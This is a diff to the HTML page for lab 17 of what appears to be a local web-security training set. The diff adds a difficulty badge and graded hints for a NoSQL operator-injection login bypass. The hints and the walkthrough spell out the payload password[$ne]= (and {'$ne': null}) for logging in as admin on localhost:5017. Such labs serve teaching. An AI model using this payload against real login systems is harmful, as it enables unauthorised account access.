@@ -33,6 +33,7 @@
   <div class="labs-detail-head">
     <span class="labs-num mono">17</span>
     <span class="labs-cat mono">Injection</span>
+    <span class="labs-diff labs-diff-medium">Medium</span>
     <span class="labs-port mono">localhost:5017</span>
   </div>
   <h1 class="h1-page" style="margin-top:14px;">NoSQL injection (operator) auth bypass</h1>
@@ -46,6 +47,8 @@ python labs/17-nosql-injection/app.py
   </div>
 
   <div class="labs-scope"><div class="mono labs-scope-h">pre-set scope</div><code class="inline">http://localhost:5017/*</code><code class="inline">http://127.0.0.1:5017/*</code></div>
+
+  <h2 class="h2-section" style="margin-top:40px;font-size:22px;">Hints</h2><p class="muted" style="font-size:13px;margin:8px 0 14px;">Stuck? Open these one at a time -- each reveals a bit more than the last.</p><div class="labs-hints"><details class="labs-hint"><summary>Hint 1</summary><p>This backend uses a NoSQL-style query -- what happens if you send an operator instead of a plain string?</p></details><details class="labs-hint"><summary>Hint 2</summary><p>Try sending the password field as an object rather than a string.</p></details><details class="labs-hint"><summary>Hint 3</summary><p>password[$ne]= (or its JSON-body equivalent {&quot;$ne&quot;: null}) can bypass an equality check that never expected an operator.</p></details></div>
 
   <h2 class="h2-section" style="margin-top:40px;font-size:22px;">Walkthrough</h2>
   <ol class="labs-steps"><li>nullock scope add http://localhost:5017/*</li><li>POST /login with  username=admin&amp;password=wrong   -&gt; 401 denied</li><li>Send to Repeater, change the body to: username=admin&amp;password[$ne]=x</li><li>You&#x27;re authenticated -- the $ne operator matched any password.</li><li>Run the active probe (nosqli): the literal vs $ne vs $eq differential (gated on a stability baseline) confirms it.</li></ol>
